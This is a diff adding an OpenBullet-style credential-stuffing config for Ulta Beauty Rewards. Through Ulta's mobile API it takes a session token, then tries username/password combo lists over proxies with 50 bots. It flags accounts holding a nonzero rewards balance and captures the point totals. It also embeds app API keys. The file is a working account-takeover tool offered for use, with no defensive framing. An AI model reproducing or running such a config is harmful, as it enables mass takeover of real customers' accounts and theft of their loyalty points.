@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Ulta Beauty Rewards",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-15T05:55:30.2797327+07:00",
+  "AdditionalInfo": "",
+  "Author": "Krackn",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST GET "https://api.ulta.com/rest/model/atg/rest/SessionConfirmationActor/getSessionConfirmationNumber?osName=Android&appVersion=5.1.1" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: ULTA/5.1.1 Android" 
+  HEADER "Pragma: no-cache" 
+  HEADER "uak: r3VvG8bmu9A9G7kAVe2Bi6viRRVRiKdYmK4psxTYF6TgZC7ckNerDfu634FbnsWQ" 
+  HEADER "apiKey: RKqP8KatAZqLPHFyB9g3R9YoAf2Wc26cT2QvVUNFm6Hwe8fbEv" 
+PARSE "<SOURCE>" LR "\":" "}" Recursive=FALSE -> VAR "SCN" "" "" 
+PARSE "<COOKIES(JSESSIONID)>" LR "" "" Recursive=FALSE -> VAR "JSESS" "" "" 
+REQUEST POST "https://api.ulta.com/rest/model/services/v1/Profile/Login" AutoRedirect=TRUE 
+  CONTENT "value.login=<USER>&value.password=<PASS>&token=563b3de8-fa1e-408b-bc97-bdc98d902361&isActive=false&fromPaypal=false&osName=Android&appVersion=5.1.1&_dynSessConf=<SCN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded;charset=UTF-8" 
+  COOKIE "JSESSIONID: <JSESS>" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: ULTA/5.1.1 Android" 
+  HEADER "Pragma: no-cache" 
+  HEADER "uak: r3VvG8bmu9A9G7kAVe2Bi6viRRVRiKdYmK4psxTYF6TgZC7ckNerDfu634FbnsWQ" 
+  HEADER "apiKey: RKqP8KatAZqLPHFyB9g3R9YoAf2Wc26cT2QvVUNFm6Hwe8fbEv" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "balancePoints\":\"0.0" 
+    KEY "balancePoints\":null" 
+    KEY "This combination of user name and password is invalid." 
+    KEY "This combination of user name and password is invalid" 
+  KEYCHAIN Success AND 
+    KEY "<SOURCE>" DoesNotContain "balancePoints\":null" 
+    KEY "<SOURCE>" DoesNotContain "success\":false" 
+    KEY "<SOURCE>" DoesNotContain "balancePoints\":\"0.0" 
+    KEY "success\":true" 
+PARSE "<SOURCE>" LR "balancePoints\":\"" "\",\"profileId" Recursive=FALSE -> CAP "Points" "" "" 
